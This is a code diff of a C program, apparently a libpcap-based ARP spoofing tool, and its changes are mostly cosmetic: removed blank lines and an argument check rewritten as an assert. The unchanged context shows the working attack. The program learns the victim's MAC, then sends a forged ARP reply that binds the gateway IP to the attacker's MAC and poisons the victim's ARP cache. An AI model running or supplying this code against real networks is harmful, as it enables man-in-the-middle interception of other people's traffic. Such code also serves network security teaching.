@@ -13,7 +13,6 @@ uint8_t IP_victim[4];
 uint8_t IP_gateway[4];
 
 
-
 void error(const char *message) {
 	fprintf(stderr, "\x1b[31mError\x1b[0m : %s\n", message);
 	exit(-1);
@@ -29,17 +28,14 @@ int load(pcap_t *h) {
     return res > 0;
 }
 
-
 int main(int argc, char *argv[]) {
-	if (argc < 4) {
-		error("Not enough arguments : bin (interface) (victim IP) (gateway IP)");
-	}
+	assert(argc > 3, "Not enough arguments : bin (interface) (victim IP) (gateway IP)");
 
 	dev = argv[1];
 	assert(inet_aton(argv[2], (in_addr *)IP_victim) > 0, "Parsing victim ip failed");
-	assert(inet_aton(argv[3], (in_addr *)IP_gateway)> 0, "Parsing gateway ip failed");;
-	pcap_t *handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
+	assert(inet_aton(argv[3], (in_addr *)IP_gateway)> 0, "Parsing gateway ip failed");
 
+	pcap_t *handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
 	assert(handle != NULL, "Cannot open interface");
 
 	getMacAddr(MAC_attack, dev);
@@ -51,12 +47,9 @@ int main(int argc, char *argv[]) {
 	
 
 	struct packet_ARP arpReq;
-
 	memcpy(arpReq.MAC_source, MAC_attack, 6);
 	memcpy(arpReq.MAC_destin, MAC_broad, 6);
-
 	arpReq.operation = htons(1);
-
 	memcpy(arpReq.hwAddr_source, MAC_attack, 6);
 	memcpy(arpReq.ptAddr_source, IP_attack, 4);
 	memcpy(arpReq.hwAddr_destin, MAC_broad, 6);
@@ -90,16 +83,13 @@ int main(int argc, char *argv[]) {
 	struct packet_ARP arpRep;
 	memcpy(arpRep.MAC_destin, MAC_victim, 6);
 	memcpy(arpRep.MAC_source, MAC_attack, 6);
-	
 	arpRep.operation = htons(2);
-	
 	memcpy(arpRep.hwAddr_destin, MAC_victim, 6);
 	memcpy(arpRep.hwAddr_source, MAC_attack, 6);
 	memcpy(arpRep.ptAddr_destin, IP_victim, 4);
 	memcpy(arpRep.ptAddr_source, IP_gateway, 4);
 
 	pcap_sendpacket(handle, (u_char *)&arpRep, sizeof(arpRep));
-
 	printf("ARP send Done.\n");
 }
 
